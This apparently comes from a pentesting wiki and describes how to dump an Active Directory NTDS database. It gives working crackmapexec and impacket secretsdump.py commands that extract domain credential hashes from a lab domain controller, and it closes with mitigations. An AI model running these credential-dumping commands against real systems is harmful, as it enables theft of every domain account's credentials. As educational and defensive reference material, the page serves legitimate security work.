# NTDS 

***Ntds*** file is a database that stores Active Directory data, including information about user objects, groups and group membership. Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.

# Exploitation

## CrackMapExec

We can dump ntds database with `crackmapexec` by executing the below command

```bash
crackmapexec smb 10.42.0.10 -u Administrator -p Password@123 --ntds

```

In the above image, we were able to dump ntds database.

## Secretsdump.py

We can also dump ntds credential with impackets `secretsdump.py`.

```bash
python3 secretsdump.py -use-vss cyber.local/Administrator:Password@123@10.42.0.10

```

# Mitigations

- Ensure Domain Controller backups are properly secured.
- Ensure that local administrator accounts have complex, unique passwords across all systems on the network.
- Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled.
- Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.
